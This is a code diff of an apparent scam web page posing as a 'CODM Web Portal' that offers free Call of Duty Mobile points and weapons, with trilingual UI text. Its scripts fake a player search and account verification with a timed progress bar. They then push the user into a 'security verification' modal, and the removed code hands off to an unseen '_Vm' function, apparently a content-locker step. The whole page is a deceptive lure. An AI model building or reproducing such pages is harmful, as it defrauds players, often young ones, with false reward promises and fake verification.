+        <svg viewBox="0 0 24 24"><path d="M23.498 6.163a3.003 3.003 0 0 0-2.11-2.108C19.524 3.545 12 3.545 12 3.545s-7.525 0-9.387.51A3.003 3.003 0 0 0 .502 6.163C0 8.07 0 12 0 12s0 3.93.502 5.837a3.003 3.003 0 0 0 2.11 2.108c1.862.51 9.387.51 9.387.51s7.524 0 9.387-.51a3.003 3.003 0 0 0 2.11-2.108C24 15.93 24 12 24 12s0-3.93-.502-5.837zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+      </a>
+    </div>
+  </footer>
 
-function generateGamepass(){
-  if(!document.getElementById('user-id').value.trim())return;
-  if(selectedItems.size===0)return;
+  <script>
+    // قاموس التراجم للغات الثلاثة
+    const translations = {
+      en: {
+        dir: "ltr",
+        title: "CODM Web Portal",
+        labelId: "Enter Player ID",
+        placeholder: "e.g. 681234567891234567",
+        btnContinue: "Continue",
+        searching: "Searching for player...",
+        verifying: "Verifying account status on global server...",
+        found: "Player Verified Successfully!",
+        labelChoosePoints: "Select your points COD :",
+        labelChooseWeapons: "Select your weapons :",
+        badgeNew: "NEW!",
+        labelVerify: "Security Verification Required",
+        btnVerify: "Verify & Confirm",
+        modalTitle: "Verification Required",
+        modalText: "To complete the secure transfer of your selected rewards to your account, please read and accept our platform's official security check.",
+        modalBtn: "Accept & Proceed",
+        linkParent: "Parent's Guide",
+        linkTerms: "Terms of Use",
+        linkPrivacy: "Privacy Policy",
+        linkCookies: "Manage Cookies"
+      },
+      ar: {
+        dir: "rtl",
+        title: "بوابة كول اوف ديتي",
+        labelId: "أدخل معرف اللاعب (ID)",
+        placeholder: "مثال: 681234567891234567",
+        btnContinue: "متابعة",
+        searching: "جاري البحث عن اللاعب...",
+        verifying: "جاري التحقق من الحساب على الخادم العالمي...",
+        found: "تم التحقق من حسابك بنجاح!",
+        labelChoosePoints: "اختر نقاط كول اوف ديتي (CP) :",
+        labelChooseWeapons: "اختر سلاحك المفضل :",
+        badgeNew: "جديد!",
+        labelVerify: "التحقق الأمني المطلوب",
+        btnVerify: "التحقق والتأكيد",
+        modalTitle: "مطلب تأكيد الهوية",
+        modalText: "لإكمال عملية الإرسال الآمن للمكافآت المحددة بنجاح إلى حسابك، يرجى استكمال فحص التحقق من الهوية لتجنب خوارزميات الحظر.",
+        modalBtn: "الموافقة والمتابعة",
+        linkParent: "دليل أولياء الأمور",
+        linkTerms: "شروط الاستخدام",
+        linkPrivacy: "سياسة الخصوصية",
+        linkCookies: "إدارة ملفات تعريف الارتباط"
+      },
+      fr: {
+        dir: "ltr",
+        title: "Portail CODM",
+        labelId: "Entrez l'ID du joueur",
+        placeholder: "ex: 681234567891234567",
+        btnContinue: "Continuer",
+        searching: "Recherche du joueur...",
+        verifying: "Vérification du statut du compte...",
+        found: "Joueur vérifié avec succès!",
+        labelChoosePoints: "Sélectionnez vos points COD :",
+        labelChooseWeapons: "Sélectionnez vos armes :",
+        badgeNew: "NOUVEAU!",
+        labelVerify: "Vérification de Sécurité Requise",
+        btnVerify: "Vérifier & Confirmer",
+        modalTitle: "Vérification Requise",
+        modalText: "Pour finaliser le transfert sécurisé de vos récompenses, veuillez passer l'étape d'assistance et de sécurité officielle.",
+        modalBtn: "Accepter & Continuer",
+        linkParent: "Guide parental",
+        linkTerms: "Conditions d'utilisation",
+        linkPrivacy: "Charte de confidentialité",
+        linkCookies: "Gérer les cookies"
+      }
+    };
 
-  const lang=window.currentLang||"en";
-  const t=translations[lang];
+    let currentLang = 'en';
+    let selectedCP = null;
+    let selectedWeapon = null;
 
-  const m=document.getElementById('loadingModal');
-  const txt=document.getElementById('loadingText');
-  m.classList.add('show');
+    // دالة تغيير اللغة
+    function changeLanguage(lang) {
+      currentLang = lang;
+      const t = translations[lang];
+      const root = document.getElementById('html-root');
 
-  txt.textContent=t.searching;
-  setTimeout(()=>txt.textContent=t.found,1200);
-  setTimeout(()=>txt.textContent=t.generating,2200);
-  setTimeout(()=>{
-    m.classList.remove('show');
-    document.getElementById('verificationModal').classList.add('show');
-  },3500);
-}
+      root.setAttribute('dir', t.dir);
+      root.setAttribute('lang', lang);
 
-function handleVerify(){
-  document.getElementById('verificationModal').classList.remove('show');
-  if(typeof _Vm==='function'){_Vm();}
-}
+      // تحديث النصوص فقط
+      document.getElementById('label-id').innerText = t.labelId;
+      document.getElementById('player-id').placeholder = t.placeholder;
+      document.getElementById('btn-text-continue').innerText = t.btnContinue;
+      document.getElementById('label-choose-points').innerText = t.labelChoosePoints;
+      document.getElementById('label-choose-weapons').innerText = t.labelChooseWeapons;
+      document.getElementById('label-verify').innerText = t.labelVerify;
+      document.getElementById('btn-text-verify').innerText = t.btnVerify;
+      
+      // تحديث نافذة التنبيه
+      document.getElementById('modal-title').innerText = t.modalTitle;
+      document.getElementById('modal-text').innerText = t.modalText;
+      document.getElementById('btn-text-modal').innerText = t.modalBtn;
 
-// initialize
-setLang("en");
-</script>
+      // تحديث الفوتر
+      document.getElementById('link-parent').innerText = t.linkParent;
+      document.getElementById('link-terms').innerText = t.linkTerms;
+      document.getElementById('link-privacy').innerText = t.linkPrivacy;
+      document.getElementById('link-cookies').innerText = t.linkCookies;
 
+      // شارات جديد
+      document.querySelectorAll('.tag-new').forEach(el => el.innerText = t.badgeNew);
+    }
+
+    // دالة محاكاة شريط التحميل والبحث
+    function startSearch() {
+      const idVal = document.getElementById('player-id').value.trim();
+      if (!idVal) {
+        alert(currentLang === 'ar' ? 'الرجاء إدخال معرف اللاعب أولاً.' : 'Please enter your Player ID first.');
+        return;
+      }
+
+      document.getElementById('btn-continue').style.display = 'none';
+      const progressContainer = document.getElementById('search-progress');
+      const progressFill = document.getElementById('progress-fill');
+      const progressStatus = document.getElementById('progress-status');
+
+      progressContainer.style.display = 'block';
+
+      let progressWidth = 0;
+      const progressTimer = setInterval(() => {
+        if (progressWidth >= 100) {
+          clearInterval(progressTimer);
+          progressStatus.innerText = translations[currentLang].found;
+          progressFill.style.background = "#ffd103";
+          document.getElementById('rewards-panel').classList.add('active');
+        } else {
+          progressWidth += 2;
+          progressFill.style.width = progressWidth + '%';
+          if (progressWidth < 50) {
+            progressStatus.innerText = translations[currentLang].searching;
+          } else if (progressWidth < 90) {
+            progressStatus.innerText = translations[currentLang].verifying;
+          }
+        }
+      }, 40);
+    }
+
+    // دالة تحديد نقاط CP
+    function selectCP(cardElement, amount) {
+      document.querySelectorAll('.cp-card').forEach(el => el.classList.remove('selected'));
+      cardElement.classList.add('selected');
+      selectedCP = amount;
+      
+      transitionToVerification();
+    }
+
+    // دالة تحديد السلاح
+    function selectWeapon(cardElement, weaponName) {
+      document.querySelectorAll('.weapon-card').forEach(el => el.classList.remove('selected'));
+      cardElement.classList.add('selected');
+      selectedWeapon = weaponName;
+
+      transitionToVerification();
+    }
+
+    // انتقال سلس نحو واجهة التحقق والصعود تدريجياً للأعلى
+    function transitionTo() {
+      const idInputWrapper = document.getElementById('id-input-wrapper');
+      const verificationWrapper = document.getElementById('verification-wrapper');
+
+      idInputWrapper.style.display = 'none';
+      verificationWrapper.style.display = 'block';
+
+      document.getElementById('main-panel').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+
+    function transitionToVerification() {
+      // إطلاق واجهة التحقق عند اختيار أي مكافأة للحفاظ على سلاسة الصفحة
+      transitionTo();
+    }
+
+    // فتح النافذة التكتيكية المنبثقة
+    function openModal() {
+      document.getElementById('custom-modal').style.display = 'flex';
+    }
+
+    // إغلاق النافذة التكتيكية المنبثقة
+    function closeModal() {
+      document.getElementById('custom-modal').style.display = 'none';
+    }
+
+    // إغلاق النافذة عند النقر خارجها
+    window.onclick = function(event) {
+      const modal = document.getElementById('custom-modal');
+      if (event.target === modal) {
+        closeModal();
+      }
+    }
+  </script>
 </body>
 </html>
